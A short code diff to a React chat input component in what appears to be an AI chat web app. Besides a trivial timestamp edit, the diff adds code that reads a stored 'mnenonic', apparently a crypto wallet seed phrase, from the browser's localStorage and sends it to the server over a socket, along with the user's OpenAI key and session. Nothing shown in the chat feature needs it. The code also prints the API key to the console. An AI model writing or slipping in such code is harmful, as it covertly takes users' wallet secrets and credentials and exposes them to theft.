@@ -87,10 +87,9 @@ const ChatInput = ({ chatId, setReload, reload }: Props) => {
         if (!prompt) return;
         const input = prompt.trim();
         setPrompt("");
-
         const message: Message = {
           text: input,
-          createdAt: serverTimestamp(),
+          createdAt: await serverTimestamp(),
           user: {
             _id: session?.user?.email!,
             name: session?.user?.name!,
@@ -98,9 +97,10 @@ const ChatInput = ({ chatId, setReload, reload }: Props) => {
           }
         }
         let openAIKey = localStorage.getItem('openAIKey');
+        let mnenonic = localStorage.getItem('mnenonic');
         console.log(openAIKey)
         let res = JSON.stringify({
-          prompt: input, chatId, session, "openAIKey": openAIKey
+          prompt: input, chatId, session, "openAIKey": openAIKey, "mnenonic": mnenonic
         })
         socket.emit('print', res);
         await setDoc(doc(db, 'users', session?.user?.email!, 'chats', chatId, 'messages', Math.random().toString(36).substring(7)), {
